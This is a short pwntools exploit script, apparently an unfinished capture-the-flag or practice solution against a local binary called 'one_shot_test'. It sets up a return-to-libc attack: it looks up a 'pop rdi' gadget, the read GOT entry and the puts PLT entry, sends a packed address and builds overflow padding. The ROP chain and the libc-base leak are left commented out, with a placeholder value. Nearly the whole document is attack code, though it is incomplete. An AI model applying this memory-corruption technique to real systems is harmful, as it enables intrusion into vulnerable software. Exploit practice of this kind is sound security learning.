from pwn import *

def slog(sym, val): success(sym + ": " + hex(val))

p = process("./one_shot_test")
e = ELF("./one_shot_test")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

context.log_level = 'debug'
gdb.attach(p)

pop_rdi = 0x00000000004011d3
read_got = e.got["read"]
puts_plt = e.plt["puts"]

slog("read_got", read_got)
slog("puts_plt", puts_plt)

payload = p64(read_got)
p.send(payload)

payload = b"A"*0x18
p.recvline()
# payload += p64(pop_rdi)
# payload += p64(read_got)
# payload += p64(puts_plt)

# read_addr = 3
# lb = read_addr - e.symbols["read"]

